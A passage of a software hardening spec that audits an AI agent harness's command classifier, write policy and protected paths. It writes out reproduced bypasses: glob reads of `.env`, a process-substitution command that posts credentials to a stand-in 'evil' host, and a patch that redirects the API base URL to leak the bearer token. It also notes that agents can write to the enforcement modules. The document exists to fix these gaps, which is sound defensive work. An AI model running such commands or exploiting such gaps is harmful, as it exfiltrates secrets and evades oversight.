# Spec: Code-quality, tech-debt and hardening plan (audit round 3)

> Status: IN PROGRESS, revision 2 (peer-reviewed) · Date: 2026-09-04 · Base: `main` @ `487870a` (PR #76)
>
> Phase 1 (R-CQ-3 … R-CQ-7) and R-CQ-30 are landed; their acceptance boxes below
> are ticked with the command that proves each, and every gate they add is
> mutation-proved. Phase 0 and Phases 2–7 are open, and Phase 0's ruleset shape
> is still the owner's decision.
>
> Revision 2 is the output of the `openspec-peer-review` step: five independent
> reviewers (Architect, SDLC/CI, QA, Product, Security) with no part in writing
> revision 1 checked every claim against the code and ran every acceptance command,
> and two anti-pattern sweeps (source, tests) were run in parallel. What they changed
> is recorded in **Review record** so the next audit does not re-derive it. The
> document is a spec so the plan tier of `make specs` (INV-17) gates it. Slices
> marked *child spec* get their own `make spec` before implementation.

## Executive summary

Revision 1 said the uncomfortable thing was that green CI is unenforced. Revision 2
has a worse one: **the product path is exploitable today, and revision 1 did not
look at it.** Two one-line classifier bypasses let any agent role read `.env` or
run arbitrary commands under the `read` action; the write side has no
credential-file rule at all, so a patch to `.env` redirects the bridge's API key to
an attacker's host on the next call; and the modules that enforce all of this are
themselves agent-writable. Those are smaller than anything in revision 1's Phases
2–5 and worth more than all of them combined. They are now Phase 1.

Revision 1's Phase 0 was also wrong in a way that would have stopped the plan:
the committed ruleset requires one approving code-owner review with no bypass
actors, on a repository with one code owner and one human author. Applying it
as-is blocks every later PR. The decision the owner has to make is not "apply or
decline"; it is which of three shapes of enforcement a single-maintainer repository
can live with.

| Phase | Outcome | PRs | Risk | Owner decision needed |
|---|---|---|---|---|
| 0 | Enforcement shape decided and recorded (ruleset with a bypass actor, zero approvals, or a second reviewer); NS-2 credential rotated; the twelve open Dependabot PRs dispositioned; the mutation-proof skill (NS-20) written so every gate below can be proved | 0 code + 2 doc | low | **yes**: ruleset shape; rotate the key |
| 1 | Product-path containment: glob and process-substitution bypasses closed, credential files denied on the write side, `apply_patch` gated on read policy, one write-authorization path, runtime-enforcement modules protected, hooks bounded by policy, policy readers fail closed on a present policy missing a key | 3 (protected) | medium | no |
| 2 | Supply chain: every action SHA-pinned with a parser that still enforces the Node 24 majors, hashed lock across all four `uv` recipes, Dockerfile without a phantom port and with a `docker` Dependabot ecosystem, and a `make` stage that actually runs `-W error::DeprecationWarning` | 2 (workflows protected) | low | **yes**: accept hashed installs |
| 3 | Policy single-source, round 2: cross-stack retry parity (child spec, lazy accessor), fallback constants extracted once and `GraphPolicy` derived from them, the bundle builder reading the policy it digests, inventory discovery extended, the interpreter that runs the primary leg made a matrix member | 3 (1 child spec) | medium | **yes**: which stack's retry set is the intent |
| 4 | Anti-patterns and duplication the gates cannot see: import-time policy I/O, positional authority bools, stdlib-attribute patch targets, unjustified socket exemptions, unwaived skips, bare `python3`, TypeScript `any` and floating promises, fixture and helper duplicates, the transitively dead `ablation.py`, shims with no removal clock | 4 (2 protected) | medium | **yes**: `ablation.py` moves to `experimental/` |
| 5 | CI truthfulness and cost: the 3.9 audit leg becomes an advisory step so no required check is unfailable, Go builds cached, a `liveness` marker and a zero-user-marker rule | 2 (workflows protected) | low | no |
| 6 | Structure and documents: the `control-plane` package (child spec), the two files nearest their size budget split *before* any step edits them, archive index, `Status:` line with tier selection so landed specs are not re-judged | 3 (1 child spec) | medium | **yes**: rename `control-plane` or record the DEC |
| 7 | Coverage rides every slice; every new gate is proved by its own negative test, never by prose | per slice | low | no |

Nineteen PRs, two of them documentation only (revision 1 said seventeen and
enumerated eighteen; the two added are the product-path slices). Highest value
per line changed: Phase 1 (four bypasses, each a handful of lines in
`governance/command_actions.py`, `write_policy.py` and `tool_executors.py`).

## Review record

What revision 1 claimed, what the reviewers found, and what revision 2 does.
Evidence is file:line or a command that was run on `8c81bb6`.

| Rev-1 item | Reviewer finding | Evidence | Rev-2 disposition |
|---|---|---|---|
| Phase 0 "apply the ruleset, zero lines, low risk" | Applying it deadlocks the plan: one approving code-owner review, no bypass actors, one code owner, one human author | `.github/rulesets/main.json:17-19,44`; `.github/CODEOWNERS` (`* @ianshank`); `git log --format=%an` | Phase 0 decides the enforcement shape and changes `test_nobody_can_bypass` with it (R-CQ-1) |
| "Harden" = supply chain | Zero product-path findings; five confirmed bypasses reproduced by running the real `classify`, `write_denial_reason` and `execute_apply_patch` | `command_actions.py:43,177`; `write_policy.py:331-381`; `tool_executors.py:199-225`; `governance-policy.json` `protected_paths` | New Phase 1 (R-CQ-3 … R-CQ-8); Phase 1 of rev 1 becomes Phase 2 |
| NS-2 not mentioned | A hardening plan omitted the roadmap's second Blocker, a live leaked credential | `grep -n "NS-2\|rotat" docs/specs/code-quality-tech-debt-plan.md` (rev 1) → nothing | Phase 0 (R-CQ-2) |
| Mutation proof "per NS-20" | The skill does not exist; NS-20 is open | `ls .mango/skills` → no `gate-mutation-proof` | NS-20 is step 0 of this plan (R-CQ-2); proof is the negative test in each AC, never prose |
| R-CQ-11 "no gate can see the `.sh` copies" | Wrong. `test_shared_kernel_shell_helpers_are_byte_identical` pins four of them and records the decision; `pretooluse_guard.sh` ×2 already delegate to the sibling `.py`; the shared `run_vitest.sh` has no root caller; three scripts branch on `BASH_SOURCE`, so an `exec` delegator sends the JVM hook to the Node allowlist; all four names are digested in the root-of-trust bundle (DEC-004) | `test_harness.py:52-62`; `pre_push_scan.sh:9-16`; `install_hooks.sh:18-22`; `harness/node/.governance/policy.json:98-102`; `policy-bundle.example.json:22-26,46-50` | Rewritten: extend the byte-identity gate to `run_vitest.sh` or delete the callerless shared copy; no delegators (R-CQ-19) |
| R-CQ-12 `_policy_is_absent` shared module | Re-litigated round 2's "checked, not a finding" without citing it; both copies document the standalone-stdlib contract; a `gates/` helper cannot be imported under the runpy shim's `sys.path` | `tech-debt-hardening-plan.md` review record row "decision_id_pattern"; `check_projections.py:31-33`; `verify_zero_skips.py:36-38`; `harness/node/scripts/check_projections.py:17-19` | Dropped for the two gates; the PEP 562 helper lives at the flat root with a `LAYERS` entry (R-CQ-20) |
| R-CQ-7 "derive from `policy_loader` fallback constants" | There are none: 21 positional literals inside seven accessor bodies; extracting them adds 21 constants the inventory must triage | `policy_loader.py:193-202,212-219,238-242,257-258,307-308,316-317`; `test_constant_triage.py:245-290,338-340` | Split: one `BUILTIN_DEFAULTS` mapping (one inventory row) read by the accessors and by `GraphPolicy` (R-CQ-12) |
| R-CQ-9 "extend discovery to dataclass and kwarg defaults" | Measured: 11 dataclass defaults (all `GraphPolicy`) + 1 kwarg default; after R-CQ-12 the net is one. The slice bounds and `+ 2` are call-site literals no discovery reaches | AST count over 76 source files | Reworded: discovery covers what it covers; the truncation constants are triaged by naming, and the gate against recurrence is `PLR2004` on the source tree (R-CQ-14) |
| R-CQ-4 "`make lock-check` unchanged"; AC-4 hash count equals pin count | All four `uv pip compile` recipes omit `--generate-hashes`, so a hashed lock fails `lock-check` forever; a correct lock has 93 pins and 2 249 hash lines | `Makefile:246-259`; trial compile in the scratchpad | Rewritten (R-CQ-10, AC-10) |
| R-CQ-3 SHA pinning | The contract suite parses `@v(\d+)`; after pinning it finds no actions and the Node 24 major test fails | `test_workflow_contracts.py:72,173-185` | R-CQ-9 mandates the parser rewrite and Dependabot's `# vX.Y.Z` comment format |
| R-CQ-5 `HEALTHCHECK` for the exposed port | Nothing listens: `CMD` is `cli.ts --help`, which exits; `corepack prepare` at line 4 runs before any `package.json` is copied; no `docker` Dependabot ecosystem, so a digest pin never moves | `Dockerfile:4,37-38`; `git grep "listen(" harness/node/src` → nothing; `.github/dependabot.yml` | Rewritten (R-CQ-11) |
| R-CQ-17 "only step is `continue-on-error`" | False: checkout, setup and `audit-install-python` are blocking; the equality test that reads the ruleset goes red when the context is removed, and rev 2 of round 2 recorded requiring it as "harmless" | `python-package.yml:301-320`; `test_workflow_contracts.py:221`; `tech-debt-hardening-plan.md` R-TDH-1 | Rewritten: the 3.9 audit becomes a `continue-on-error` *step* in the `audit` job, so the check disappears rather than being required-but-soft (R-CQ-22) |
| R-CQ-19 `regression` marker | Contradicts `harness/CONTRACT.md:102-114` ("selected by path, not by a pytest marker"), a protected file rev 1 did not list; `-m regression` on the CLI replaces `addopts`' `-m 'not live'` | CONTRACT.md; `pyproject.toml:51`; `pytest -m regression --co -q` → 0 collected | Marker dropped; NS-11 (reproductions in the wrong tier) is the real regression-tier item and is referenced, not duplicated (R-CQ-24) |
| R-CQ-23 `Status:` on every spec | Touching all 24 specs makes them "modified plans" and the full tier fails three landed specs today; nothing flips a spec to `LANDED`; the template is excluded by name | `python harness/shared/validate_plan.py --repo-root . --all` → 3 findings | Rewritten: `Status:` selects the tier; `LANDED ⇔ zero open boxes` both directions; template scaffolds the line (R-CQ-28) |
| AC-28 `pytest -W error::DeprecationWarning` | No `make` stage runs it; the shim test's docstring says `make ci` does; round 2's AC-28 was ticked on the same phantom | `grep -rn "error::DeprecationWarning" Makefile pyproject.toml .github/workflows` → 0 | Stage added to `coverage-python` (R-CQ-11); round 2's record corrected here |
| R-CQ-24 baseline as a floor | 99.29 % / 97.81 % restated as a MUST is a threshold outside `governance-policy.json` | CLAUDE.md non-negotiable 1 | Floors from policy; the baseline is a report line (R-CQ-31) |
| R-CQ-15 fixture list | `run_script` is not a duplicate (2 vs 4 params; DEC-041 placed it deliberately); `_write_json` has one definition; the API-key fixture is two, not three; a naive duplicate-body rule fires on 5 legitimate groups today | `_zero_skip_harness.py:31` vs `test_validators.py:18`; AST scan: 20 identical-body groups, 12 fixtures, 5 distinct tests | Corrected list; rule scoped to top-level fixtures and tests with a waiver dict (R-CQ-21) |
| R-CQ-13 `lats_enabled` gains a reader | Already recorded as a shape-only key (CONTRACT.md:83, DEC-027) and pinned false by two tests; three test importers of `ablation` were not in files touched | `test_neurosym_synthesis.py:37`; `test_invariant_liveness.py:75`; `test_ablation.py:5`, `test_lats_optimizer.py:8` | Reader clause dropped; three tests added to scope (R-CQ-25) |
| R-CQ-10 URL "one constant per stack" | Already constants (`DEFAULT_BASE_URL`, `DEFAULT_NEMOTRON_CONFIG.baseUrl`); only `/chat/completions` is a repeated literal; mask widths are literals in **both** stacks | `nemotron_bridge.py:32`; `nemotron-client.ts:33,174,237`; `secret-masker.ts:21-22` | Reworded (R-CQ-15) |
| R-CQ-10 interpreter "one value" | Two workflow files cannot share a constant in-tree; 3.11 is in no matrix; 3.12 is | `python-package.yml:44,109,264`; `scheduled-drift.yml:38,119,234` | Primary leg moves to 3.12, a matrix member (R-CQ-16) |
| R-CQ-8 bundle `version` | Bundle-format version and policy `schema_version` are distinct facts that coincide at `2.0.0`; the builder digests the node mirror, not the shared policy | `build_policy_bundle.py:49,52` | `policy_id` and the categories are policy-sourced; `version` stays as a triaged constant (R-CQ-13) |
| AC-7, AC-12, AC-13, AC-17, AC-19, AC-23 commands | AC-12's `git grep --and` never matches; AC-13's `--include` is misplaced and the import probe contradicts import-silence; AC-17 names a test that never reads the ruleset; AC-19's `-m` overrides `addopts`; AC-23's `grep -c` cannot print 0 | Each run on `8c81bb6` | All rewritten; every AC below was executed on the tree and its pre-change result is stated |
| Stage attribution | `make digest-regen`, `make lint`, `make check-dedup`, `make validate` do not run the pytest the AC names | Makefile recipes | Every stage is the target that runs the check |
| Phase 3 "depends on nothing" (NS-29) | Removal versions depend on NS-3 (a settled release); no tag exists | `git tag -l` → empty | NS-29 corrected; NS-3 is open question 3 |
| Items that should be done, not planned | Seven one-line fixes spread across seven PRs | `verify_repository.py:18`; `Dockerfile:4`; `harness/README.md:1`; `run_vitest.sh:6-7`; `god-file-decomposition.md:21,53`; `clampToBounds`; `docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md` | One unprotected trivia PR (R-CQ-30) |
| Open questions 2, 4, 6, 7 | Already carried the plan's own answer | rev 1 §Open questions | Decided in the text; three remain |

Verified correct and kept: 20 tag-pinned `uses:`; 0 `--hash` lines; nine
byte-identical `.sh` files; `continue-on-error` on the 3.9 audit step; the
cross-stack retry divergence; `GraphPolicy`'s eleven literal fields; five
`python-version: "3.11"` sites; `security` marker with zero users; the five landed
specs with every box open; mypy 2.0's removal of `--python-version 3.9`; `main`
unprotected; run 434 green; the local gate baseline.

## Problem statement

All numbers measured on `487870a` (spec commit `8c81bb6`). Items 1–11 are revision
1's, corrected where the review found them wrong; items 12–16 are new.

**1. The gates are green and the guarantees are advisory.** Run 434 on `main` is
green on every job. Locally: `make lint` clean (ruff, mypy on 209 files, vulture,
py-compat on 232 files); `make coverage-python` 2 976 passed, 1 skipped (waived,
DEC-026), 7 deselected, lines **99.29 %**, branches **97.81 %**, 76 files measured,
73 at or above the per-file floor; every governance target passes; Vitest 112
passed, 11 skipped (all waived). `main` is unprotected (NS-1). The committed
ruleset cannot be applied as it stands: `required_approving_review_count: 1` with
`require_code_owner_review: true` and `bypass_actors: []`, on a repository whose
`CODEOWNERS` routes every path to one account and whose history has one human
author. GitHub does not let an author approve their own PR.

**2. The product path is bypassable in four places, each reproduced.**
`governance/command_actions.py:177` grades `secret_access` only when the literal
credential filename appears; the command runs under `bash -c`
(`process_backend.py:79`), which expands globs, so `cat .en?` and `head .e*`
classify as `read` and print `.env`. `_COMPOUND` (`:43`) catches `; | & $( `` `
\n` but not process substitution: `cat <(curl -s http://evil -d @.en?)`
classifies `read` and is arbitrary execution plus egress for every role.
`write_denial_reason(".env")` returns `None` (`write_policy.py:331-381` denies
`.git` segments and `protected_paths` only), and `resolve_environment`
(`nemotron_bridge.py:139-160`) reads `NVIDIA_BASE_URL` from the repository-root
`.env` when the process environment lacks it, so
`apply_patch(".env", "NVIDIA_API_KEY=", "NVIDIA_BASE_URL=http://evil\nNVIDIA_API_KEY=")`
succeeds and the next `complete_chat` posts the bearer token to the attacker.
`execute_apply_patch` (`tool_executors.py:199-225`) never calls
`read_denial_reason`, so `matched 0 times` versus `Success` is a substring oracle
over files the read side refuses. The modules that enforce all of this
(`tool_executors.py`, `orchestrator/loop.py`, `orchestrator/dispatcher.py`,
`nemotron_bridge.py`, `tool_schemas.py`, `agent_prompts.py`, the root
`conftest.py` the verifier's `make test-python` imports) are absent from
`protected_paths` and therefore agent-writable, while their siblings
`write_policy.py` and `agent_authority.py` are protected. Two copies of the
write-authorization path disagree: `mcp_server.py:42-49` asks the PDP with
`tee <path>`; `orchestrator/dispatcher.py:64-73` asks nothing.

**3. Python policy readers fail open on a present policy; the Node reader does
not.** `policy_loader._int_value` (`:175-179`) returns a positional literal when a
present policy lacks the key; `policy.ts:58-69` throws. `validate_invariants.py:118`
defaults `protected_paths` to `[".github/**"]` and `:69-70` defaults `limits`, in
the gate whose docstring says it fails closed. `MAX_FILE_LINES`,
`MAX_TEST_FILE_LINES` and `MAX_SHIM_LINES` (`validate_invariants.py:49-54`,
`check_dedup.py:120-125`) let any shell raise a budget above the policy with no
decision entry. `orchestrator/hook_runner.py:49-51` runs agent-authored hooks with
`timeout=self.tool_timeout`, which is `None` unless a caller sets it; the
`ExecutionLoop` never does. `governance/verify_zero_skips.py:80` evaluates
`ID_RE = _decision_id_regex()` at import and that function can `raise SystemExit`,
so importing the module can exit the interpreter. `policy_decision.decide`
(`:46-51`) takes `human_approved: bool = False` positionally; the two callers that
already do this right use keyword-only. `.mango/hooks/block_dangerous.sh` has no
`set -euo pipefail`; a missing `jq` leaves `COMMAND` empty and the deny hook allows
(dormant by DEC-003, recorded rather than fixed).

**4. The two stacks disagree about what to retry.** `nemotron_bridge.py:104`
retries `{429, 500, 502, 503, 504}`; `retry.ts:56-58` retries 429 plus every
status in `[500, 600)`. `nemotron.max_retries` is policy-sourced in both
(DEC-036); the count agrees and the set diverges, with no parity test.

**5. The policy has three in-code copies and the control-plane bundle a fourth.**
`policy_loader.py` carries 21 positional literal fallbacks inside seven accessors.
`langgraph/policy.py:21-53` carries eleven of them again as dataclass defaults,
pinned equal by test and invisible to the inventory's discovery, which finds
module-level upper-case numeric names only (`test_constant_triage.py:245-290`).
`build_policy_bundle.py:48-61` restates `policy_id` and the five
`human_approval_required` categories as literals nothing compares to the policy.

**6. Duplication and dead code below the gates.** `check_dedup.py:246` globs
`*.py`; `test_harness.py:52-62` pins four `.sh` helpers byte-identical across
stacks (and says why: shell has no import mechanism), but `run_vitest.sh` is
outside that list and the shared copy has no caller at root. `_policy_is_absent`
and `_decision_id_regex` are duplicated by documented contract
(`check_projections.py:31-33`, `verify_zero_skips.py:36-38`); the PEP 562
`__getattr__` shim body is copy-pasted in four modules plus a property-shaped
fifth in `tool_budget.py:66`; the ImportError re-import bootstrap is copied nine
times and accounts for 17 of the 30 `type: ignore` comments in source; five
env-int coercers exist with two behaviours (warn versus silent); five JSON-object
loaders exist with five error taxonomies (`broker.py:233-235` admits the drift).
`langgraph/ablation.py`'s only non-test importer is parked
`experimental/lats_optimizer.py:10`. Five deprecation shims promise removal
"after one minor release"; no release has been tagged (NS-3), so the clock never
started, and no test would fail when it runs out.

**7. Complexity and typing.** `radon` reports 22 functions at cyclomatic
complexity 11 or higher in source, three at 25 or higher: `complete_chat`
(`nemotron_bridge.py:179`, complexity 27, 11 parameters, 67 statements),
`classify_shim` (`check_dedup.py:155`), `validate_signal_dict`
(`cognitive_signal.py:157`). `ExecutionLoop.__init__` takes 13 parameters.
`ruff --select PLR2004` finds 9 magic-value comparisons in source, among them the
`64` in `verify_repository.py:18` that duplicates `SHA256_HEX_LEN` and the `3` in
`orchestrator/loop.py:109`. `langgraph/graph.py`'s routing functions annotate
`config: Any`, which LangGraph warns about seven times per suite run. `nodes.py`
returns `dict[str, Any]` from every node while `MangoState` exists. Node:
`nemotron-client.ts` uses `any` at `:173,196-215,204`, patches `Error` ad hoc at
four sites, swallows a credential-file read error at `:145-147`, and `cli.ts:119`
is a floating promise; `eslint.config.js` enables `max-lines` only.

**8. Supply chain is weaker than the repository's own contract.** All 20 `uses:`
references are tag-pinned; `harness/CONTRACT.md:49` requires full SHAs of every
adopter. `requirements-lock.txt` has 0 `--hash` lines and both workflows install it
with plain `pip install -r`. `Dockerfile` runs as root, declares `EXPOSE 8080`
for a `CMD` that prints usage and exits, pulls `node:22-alpine` by floating tag,
runs `corepack prepare` before any `package.json` exists in the stage, and
restates `pnpm@11.23.0`. No `docker` ecosystem in `.github/dependabot.yml`.

**9. A stage that does not exist, and skips that are not waived.**
`test_deprecation_shims.py:5-9` says `make ci` runs
`pytest -W error::DeprecationWarning … -k "not deprecation_shims"`; no recipe does,
and round 2's AC-28 was ticked against that phantom. `test_autonomous_healing.py:12`
carries a module-wide `enable_socket` with no justification and no need (all seven
tests pass with the marker stripped); `test_mcp_server.py:20` carries one twice as
broad as needed. `test_orchestrator_agent_loop.py:171` skips without a decision id;
five in-body `pytest.skip` reasons in `test_mango_mas_live.py` lack the `DEC-026`
the waiver requires; `test_makefile_contracts.py:100` guards a target that exists.
`test_validate_plan.py:204,218,228` spawn a bare `python3` from `PATH` (DEC-013);
six shared shell scripts do the same. 25 tests patch `urllib.request.urlopen` on
the stdlib module, which works only because the bridge does `import urllib.request`
(the PR #60 shape). `test_validate_invariants.py:124-128` sets `os.environ`
without `monkeypatch`.

**10. Hard-coded values in the inventory's blind spots.**
`governance/verification.py:73` defaults `timeout: int = 300`, equal to
`orchestrator.api_timeout_sec`, read from nowhere; `langgraph/nodes.py:76,97,175`
truncate at `[:200]` and `:67` at `[:80]` for the purpose `TASK_LOG_PREVIEW_CHARS`
(DEC-039) already names; `plan_rules.py:193,310` truncate at 40 and 48 for
adjacent purposes; `meta_tools.py:92` adds a bare `+ 2`; `Makefile:68`
`VULTURE_MIN_CONFIDENCE ?= 80` is a lint threshold outside the policy;
`/chat/completions` is a literal at three sites across two stacks; the secret-mask
widths are literals in both stacks. `python-version: "3.11"` appears five times
for an interpreter in no matrix; 3.12 is a matrix member.

**11. CI cost and one check that cannot fail on findings.** Per PR: eight
checkouts, the full suite four times, `go install` for gitleaks and osv-scanner
twice with no cache. `dependency-audit (3.9)` is required by the ruleset export and
its audit step is `continue-on-error` (DEC-017): it can fail on install, never on a
finding. The 3.9 leg goes away with NS-6; until then it should not be a check.

**12. Structure and tiers.** `harness/shared/` is 41 flat modules across six
concerns plus six compatibility shims; DEC-020 and DEC-029 decline a regroup and
this plan keeps that. `harness/control-plane` is not importable and has spawned
eight bespoke path loaders, a third `testpaths`/coverage/Makefile entry each, and
two spellings of one module in `test_constant_triage.py:222,242`. The `security`
marker has zero users; `slow` marks four modules and nothing selects it. `test_harness.py`
(348 lines, the only `unittest` module) carries ten concerns that each have a
dedicated module elsewhere. Nothing is over budget; `nemotron-client.ts` (432) is
68 lines from a hard ESLint failure and `plan_rules.py` (428) is 72 from the Python
gate, and revision 1's own steps edited `plan_rules.py` twice before splitting it.

**13. Documents that contradict the tree.** `docs/reports/TEST-REPORT.md:8-15`
says "do not read any number below as current"; `docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md`
is the only loose file at `docs/` root and contradicts `god-file-decomposition.md`,
which itself states a branch floor of 85 % against a policy of 80.
`harness/README.md:1` (v2.0) and `harness/CONTRACT.md:1` (v2.1) sit outside the
six mirrors `test_documentation_truth.py` pins. Five landed specs show every
acceptance box open (`verdict-propagation.md` 15, `plan-review-framework.md` 11,
`agent-read-patch-tools.md` 10, `mangomas-integration-core.md` 9,
`node-policy-wiring.md` 7); the plan tier run over all specs fails three of them
today, which is why the tier is scoped to modified plans (INV-17) and why a status
line cannot simply be added to all of them. `vitest.config.ts:11` names a test
file that does not exist.

**14. The Dependabot queue.** Twelve open bot PRs. #62–#66 bump action majors and
are the vehicle for Phase 2's SHA pins. #67 proposes mypy 1.11.2 → 2.3.1; the mypy
2.0 changelog drops `--python-version 3.9`, so it cannot land while
`requires-python` is `>=3.9` (NS-6). #68–#73 are `pip` bumps opened before DEC-033
removed that ecosystem.

**15. Enterprise surface, checked before listing.** Present: `CODEOWNERS` over
every path, a 42-entry decision log (the ADR log in substance), `docs/rca/`,
`SECURITY.md`, `harness/docs/ROOT_OF_TRUST.md`. Absent: any SBOM target, a release
process (no tag has ever existed), a versioned contract for `api_server`'s
`/api/orchestrate` (no OpenAPI snapshot pinned by a test), and a threat model
(`README.md:48` points at a C4 section that is an invariant list with no asset,
attacker or entry-point enumeration).

**16. Runtime cost that no gate measures.** `orchestrator/loop.py:136,144` sends
the shared three-agent `conversation_history` on every turn of every agent, so the
verifier's prompt carries the planner's and reasoner's full tool output;
`tool_executors.py:154,212` and `process_backend.py:112-129` read whole files and
capture whole output before `_cap` applies. Recorded here as the "optimize" item
the request asked for and this plan defers to a spec of its own (open question 4).

### Team reflection

- **Architecture.** Revision 1 proposed three seams that did not exist
  (fallback constants, shell delegators, a `gates/` helper importable under runpy)
  because it reasoned from module names instead of reading the call sites. The
  rule for revision 2: every mechanism names the line it changes and the test that
  pins the line today.
- **SDLC / CI.** Round 2 made the gates truthful and left one stage as prose. This
  round adds the stage, makes the pins immutable, and turns the one
  required-but-soft check into a step. The ruleset shape is the decision that
  unblocks all of it.
- **QA.** The suite's own hygiene has the same defect classes as the product: a
  socket exemption covering nothing, skips outside their waivers, patch targets
  that survive by accident. The duplicate-body rule is scoped so it does not fire
  on the five legitimate groups it would hit today.
- **Product.** Revision 1 was eleven parts gate to one part product. Revision 2
  leads with the product path, keeps the gate work that protects it, and names
  what it still does not do (item 16, the enterprise gaps) instead of implying
  coverage.
- **Security.** The adopter templates require what the root does not do, and the
  containment layer refuses `cat .env` while allowing `cat .en?`. Fix the product
  path first; the supply chain second; the gates that watch both third.

### Explicitly not doing

- Regrouping `harness/shared/` (DEC-020, DEC-029 stand; C-CQ-2).
- Deleting or rewriting the per-stack `.py` shims (DEC-004).
- Converting the byte-identical `.sh` helpers to delegators: `test_harness.py:52-62`
  records why they are copies, and DEC-004 sizes a body change as a root-of-trust
  rotation.
- Moving the Python floor to 3.10 (NS-6, its own spec). Items 11 and 14 are
  unblocked by it and say so.
- A `regression` pytest marker (`harness/CONTRACT.md:102-114` decides path
  selection); NS-11 is the regression-tier item.
- Annotating the test suite; enforcing `coverage.functions` and `coverage.statements`
  on the Python side (coverage.py emits no function metric; CONTRACT.md records the
  Node-only scope).
- The conversation-history and whole-file-read cost (item 16): a behavioural
  change to the orchestrator, its own spec.
- SBOM, release process, API contract snapshot, threat model (item 15): each is a
  product decision; this plan records the gap and does not schedule them.

## Requirements

Phase 0 — enforcement shape, the leaked key, the queue, the proof procedure (0 code lines).

- R-CQ-1: `main` MUST carry a ruleset that a single-maintainer repository can
  merge under, chosen from three recorded shapes: the committed export plus a
  bypass actor for the repository-admin role; the export with
  `required_approving_review_count: 0` and the nine checks still required; or the
  export as committed plus a second reviewing account. The choice and its reason
  MUST be a decision-log entry, `test_nobody_can_bypass` MUST change to assert the
  chosen shape, and either the branches API reports `"protected": true` or the
  entry records the decline, closing NS-1.
- R-CQ-2: Before any Phase 1 slice merges, the credential DEC-014 documents MUST
  be rotated at the provider and recorded (NS-2, done first, off-tree); the twelve
  open Dependabot PRs MUST be dispositioned in one entry (#62–#66 superseded by the
  SHA pins of R-CQ-9, #67 closed as blocked on NS-6 with the mypy 2.0
  `--python-version 3.9` removal cited, #68–#73 closed under DEC-031 and DEC-033);
  and `.mango/skills/gate-mutation-proof/SKILL.md` MUST exist (NS-20) so the
  negative test every acceptance criterion below carries has a written procedure.

Phase 1 — product-path containment (3 PRs; `harness/shared/governance/**`,
`write_policy.py`, `read_policy.py`, `governance-policy.json` are protected).

- R-CQ-3: `command_actions.classify` MUST grade `secret_access` for any argument
  that can expand to a credential file: an argument containing a glob character
  (`*`, `?`, `[`) whose literal prefix matches the start of a credential filename,
  or any glob argument at all when the command is a reader; and MUST grade
  `destructive` (the existing "chains or substitutes" reason) for process
  substitution `<(` and `>(`. `cat .en?`, `head .e*` and
  `cat <(curl -s http://evil -d @.en?)` MUST NOT classify as `read`.
- R-CQ-4: `write_policy.write_denial_reason` MUST deny every path
  `read_policy.read_denial_reason` denies as credential-bearing, composing the same
  `CREDENTIAL_FILENAME_ALTERNATION` rather than restating it, so `.env` cannot be
  written by any role; and `tool_executors.execute_apply_patch` MUST call
  `read_denial_reason` before reading the target, so a patch cannot be a substring
  oracle over a file `read_file` refuses.
- R-CQ-5: There MUST be one write-authorization path: `orchestrator/dispatcher.py`
  and `mcp_server.py` MUST both authorize writes through the same function, which
  asks the PDP as `mcp_server._broker_authorize_write` does today; the duplicated
  six-tool registry MUST be built from `tool_schemas.NEMOTRON_TOOLS` in one place
  and imported by both.
- R-CQ-6: The runtime-enforcement modules an agent must not rewrite MUST be listed
  in `protected_paths`: `harness/shared/tool_executors.py`,
  `harness/shared/orchestrator/**`, `harness/shared/nemotron_bridge.py`,
  `harness/shared/tool_schemas.py`, `harness/shared/agent_prompts.py`,
  `harness/shared/tool_dispatch.py` and the repository-root `conftest.py`;
  `write_denial_reason` on each MUST return a denial and
  `test_protected_path_liveness.py` MUST fail on any entry that matches no file.
- R-CQ-7: `orchestrator/hook_runner.py` MUST run hooks with a timeout resolved
  from `orchestrator.tool_timeout_sec` when the caller passes none, MUST capture
  their output, and MUST NOT run with `timeout=None`; `policy_decision.decide`
  MUST take `human_approved` keyword-only.
- R-CQ-8: A present policy missing a key MUST fail closed in every Python reader
  as it does in `policy.ts`: `policy_loader` keeps its literal fallbacks only behind
  `policy_file_is_absent()` and raises `PolicyError` otherwise;
  `validate_invariants.py` MUST NOT default `protected_paths` or `limits`; the
  `MAX_FILE_LINES`, `MAX_TEST_FILE_LINES` and `MAX_SHIM_LINES` environment
  overrides MUST only tighten a budget (`min(env, policy)`) or be removed; and
  `governance/verify_zero_skips.py` MUST compute `ID_RE` lazily so importing the
  module performs no policy I/O and cannot exit the interpreter.

Phase 2 — supply chain and the missing stage (2 PRs; workflows, `Makefile` protected).

- R-CQ-9: Every `uses:` in `.github/workflows/*.yml` MUST reference a full 40-hex
  commit SHA followed by the tag comment Dependabot writes (`@<sha> # vX.Y.Z`);
  `test_workflow_contracts.uses_lines` MUST parse that form and derive the major
  from the comment, a SHA without a version comment MUST be a finding, and the
  Node 24 major table MUST still be enforced; `actions/cache` (R-CQ-23) joins the
  table in the same change.
- R-CQ-10: All four `uv pip compile` recipes (`lock`, `lock-check`,
  `lock-upgrade-check`, `lock-upgrade`) MUST pass `--generate-hashes`, the two
  workflow install steps MUST pass `--require-hashes`, and
  `test_workflow_contracts.py` MUST fail on a requirement line not followed by a
  `--hash=` line and on an install step without the flag; `pip-audit` MUST be shown
  to accept the hashed lock in the `audit` job before the change merges.
- R-CQ-11: `Dockerfile` MUST pin `node:22-alpine` by digest with a `docker`
  ecosystem added to `.github/dependabot.yml`, copy `harness/node/package.json`
  before `corepack prepare` and obtain pnpm from `packageManager` with no restated
  version, run the runtime stage under a non-root `USER`, and MUST NOT `EXPOSE` a
  port nothing listens on; a test parses the file and fails on any of the five.
  `coverage-python` MUST run `pytest -W error::DeprecationWarning` with the shim
  module selected out by a registered `deprecation_shims` marker, so the stage
  `test_deprecation_shims.py:5-9` describes exists.

Phase 3 — policy single-source, round 2 (3 PRs).

- R-CQ-12: `policy_loader` MUST hold its built-in fallbacks in one
  `BUILTIN_DEFAULTS` mapping (one inventory row) read by the accessors, and
  `GraphPolicy`'s field defaults MUST be `field(default_factory=…)` reads of that
  mapping, preserving the pure no-config fallback `langgraph-policy-wiring.md`
  decided; the equality test stays as the regression guard, and
  `test_import_direction.LAYERS` MUST gain entries for `policy_loader` and
  `langgraph.policy` so the new edge is direction-checked.
- R-CQ-13 (*child spec* `retry-parity`): The retryable HTTP status set MUST be one
  policy key, `nemotron.retryable_statuses`, exposed by a lazy accessor
  `retry_policy.retryable_statuses()` (never a policy-sourced module constant, so
  `import nemotron_bridge` stays I/O-free) and read by `retry.ts`; a parity test in
